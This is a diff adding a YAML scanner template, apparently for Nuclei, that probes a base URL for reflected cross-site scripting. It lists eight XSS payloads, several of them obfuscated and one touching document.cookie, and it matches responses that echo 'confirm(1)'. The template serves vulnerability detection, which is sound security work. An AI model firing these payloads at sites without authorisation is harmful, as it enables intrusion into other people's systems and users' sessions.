@@ -1,0 +1,45 @@
+id: ScanReflectedXSS
+
+info:
+  name: Scanner Cross-Site Scripting Reflected
+  author: Hernan Rodriguez
+  severity: Medium
+  description: XSS via GET parameter
+  reference: https://www.linkedin.com/in/hernanrodriguez-/
+    - 
+  tags: xss
+
+requests:
+  - method: GET
+
+    path:
+    
+      - "{{BaseURL}}'><Svg Only=1 OnLoad=confirm(1)>"
+      - "{{BaseURL}}'><details/open/ontoggle=confirm(1)>"
+      - "{{BaseURL}}'><svg><circle><set onbegin=confirm(1) attributename=fill>"
+      - "{{BaseURL}}'6'%22()%26%25%22%3E%3Csvg/onload=confirm(1)%3E/"
+      - "{{BaseURL}}'</script><img src=x onerror=confirm(1)>"
+      - "{{BaseURL}}'<iframe/onload=confirm(1)>"
+      - "{{BaseURL}}'\"><sVg/OnLuFy=\"X=y\"oNloaD=;1^confirm(1)>/``^1//"
+      - "{{BaseURL}}\"><D3V%0aONPoiNtERENTEr%0d=%0d[document.cookie].find(confirm)%0dx>"
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+            - "confirm(1)"
+
+        condition: and
+      - type: status
+        status:
+          - 200
+          - 500
+          - 403
+          - 301
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
